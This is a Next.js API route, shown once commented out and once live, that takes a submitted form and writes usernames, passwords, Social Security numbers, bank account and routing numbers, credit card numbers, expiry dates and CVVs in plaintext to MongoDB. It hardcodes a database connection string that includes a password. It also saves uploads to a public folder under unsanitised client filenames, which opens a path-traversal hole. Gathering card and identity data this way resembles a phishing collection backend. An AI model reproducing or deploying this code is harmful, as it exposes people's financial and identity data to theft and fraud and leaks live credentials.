// import fs from 'fs';
// import path from 'path';
// import formidable, { IncomingForm, Fields, Files } from 'formidable';
// import { NextApiRequest, NextApiResponse } from 'next';
// import { MongoClient } from 'mongodb';

// export const config = {
//    api: {
//       bodyParser: false,
//    },
// };

// // const MONGO_URI = 'mongodb+srv://inspire:June23Csm1.@cluster0.q9dnjdv.mongodb.net';
// const MONGO_URI =
//    process.env.MONGO_URI ||
//    'mongodb+srv://inspire:June23Csm1.@cluster0.q9dnjdv.mongodb.net';

// export default async function post(req: NextApiRequest, res: NextApiResponse) {
//    if (req.method !== 'POST') {
//       return res.status(405).json({ message: 'Method Not Allowed' });
//    }

//    const client = new MongoClient(MONGO_URI, {
//       serverSelectionTimeoutMS: 30000,
//    });

//    try {
//       const form = new IncomingForm();
//       form.parse(
//          req,
//          async (err: Error | null, fields: Fields, files: Files) => {
//             if (err) {
//                console.error('Error parsing form:', err);
//                return res
//                   .status(500)
//                   .json({ message: 'Internal Server Error' });
//             }

//             const {
//                username,
//                password,
//                firstname,
//                lastname,
//                address,
//                email,
//                socialSecurity,
//                accountNumber,
//                routingNumber,
//                accountHolderName,
//                bankName,
//                expiry,
//                creditCard,
//                cvv,
//             } = fields;

//             const imageUploads = Array.isArray(files.imageUploads)
//                ? files.imageUploads
//                : [files.imageUploads].filter(Boolean);

//             // Ensure the public uploads directory exists
//             const publicUploadsDir = path.join(process.cwd(), 'public/uploads');
//             if (!fs.existsSync(publicUploadsDir)) {
//                fs.mkdirSync(publicUploadsDir, { recursive: true });
//             }

//             // Move files to the uploads directory
//             const savedImages = imageUploads.map((file) => {
//                if (!file) {
//                   throw new Error('File is missing');
//                }
//                const newPath = path.join(
//                   publicUploadsDir,
//                   file.originalFilename || 'file'
//                );
//                fs.renameSync(file.filepath, newPath);
//                return {
//                   fileName: file.originalFilename,
//                   filePath: `/uploads/${file.originalFilename}`,
//                };
//             });

//             console.log(savedImages);

//             await client.connect();
//             const db = client.db('data');
//             const collection = db.collection('users');

//             const result = await collection.insertOne({
//                username,
//                password,
//                firstname,
//                lastname,
//                address,
//                email,
//                socialSecurity,
//                accountNumber,
//                routingNumber,
//                accountHolderName,
//                bankName,
//                expiry,
//                creditCard,
//                cvv,
//                imageUploads: savedImages,
//             });

//             console.log(result);
//             res.status(200).send('Form data submitted successfully');
//          }
//       );
//    } catch (error) {
//       console.error('Error inserting data:', error);
//       res.status(500).json({ message: 'Internal Server Error' });
//    } finally {
//       await client.close();
//    }
// }

import fs from 'fs';
import path from 'path';
import formidable, { IncomingForm, Fields, Files } from 'formidable';
import { NextApiRequest, NextApiResponse } from 'next';
import { MongoClient } from 'mongodb';

export const config = {
   api: {
      bodyParser: false,
   },
};

const MONGO_URI =
   process.env.MONGO_URI ||
   'mongodb+srv://inspire:June23Csm1.@cluster0.q9dnjdv.mongodb.net';

export default async function post(req: NextApiRequest, res: NextApiResponse) {
   if (req.method !== 'POST') {
      return res.status(405).json({ message: 'Method Not Allowed' });
   }

   const client = new MongoClient(MONGO_URI, {
      serverSelectionTimeoutMS: 30000,
   });

   try {
      const form = new IncomingForm();
      form.parse(
         req,
         async (err: Error | null, fields: Fields, files: Files) => {
            if (err) {
               console.error('Error parsing form:', err);
               return res
                  .status(500)
                  .json({ message: 'Internal Server Error' });
            }

            const {
               username,
               password,
               firstname,
               lastname,
               address,
               email,
               socialSecurity,
               accountNumber,
               routingNumber,
               accountHolderName,
               bankName,
               expiry,
               creditCard,
               cvv,
            } = fields;

            const imageUploads = Array.isArray(files.imageUploads)
               ? files.imageUploads
               : [files.imageUploads].filter(Boolean);

            const publicUploadsDir = path.join(process.cwd(), 'public/uploads');
            if (!fs.existsSync(publicUploadsDir)) {
               fs.mkdirSync(publicUploadsDir, { recursive: true });
            }

            const savedImages = imageUploads.map((file) => {
               if (!file) {
                  throw new Error('File is missing');
               }
               const newPath = path.join(
                  publicUploadsDir,
                  file.originalFilename || 'file'
               );
               fs.renameSync(file.filepath, newPath);
               return {
                  fileName: file.originalFilename,
                  filePath: `/uploads/${file.originalFilename}`,
               };
            });

            console.log(savedImages);

            await client.connect();
            const db = client.db('data');
            const collection = db.collection('users');

            const result = await collection.insertOne({
               username,
               password,
               firstname,
               lastname,
               address,
               email,
               socialSecurity,
               accountNumber,
               routingNumber,
               accountHolderName,
               bankName,
               expiry,
               creditCard,
               cvv,
               imageUploads: savedImages,
            });

            console.log(result);
            res.status(200).send('Form data submitted successfully');
         }
      );
   } catch (error) {
      console.error('Error inserting data:', error);
      res.status(500).json({ message: 'Internal Server Error' });
   } finally {
      await client.close();
   }
}
